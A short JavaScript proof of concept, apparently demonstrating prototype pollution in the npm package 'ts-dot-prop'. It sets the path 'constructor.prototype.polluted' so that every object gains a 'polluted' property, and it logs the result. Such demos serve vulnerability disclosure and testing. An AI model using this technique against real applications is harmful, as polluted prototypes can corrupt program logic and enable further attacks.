Object.prototype.hasOwnProperty = () => true;
const tsDot = require('ts-dot-prop');
let obj = {};
console.log({}.polluted);
tsDot.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);